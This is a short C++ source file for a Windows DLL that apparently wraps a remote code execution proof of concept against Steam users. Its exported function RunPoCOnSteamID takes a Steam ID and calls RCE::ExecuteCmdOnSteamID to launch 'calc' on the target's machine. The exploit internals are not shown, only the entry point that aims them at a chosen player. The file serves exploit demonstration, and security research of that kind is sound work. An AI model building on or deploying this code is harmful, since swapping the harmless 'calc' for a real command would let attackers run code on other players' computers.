#include "Include.h"

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

extern "C" __declspec(dllexport) void RunPoCOnSteamID(const wchar_t* steamID)
{
    try
    {
        RCE::ExecuteCmdOnSteamID(std::stoull(steamID), "calc", SW_SHOWNORMAL);
    }

    catch (std::exception& e)
    {}
}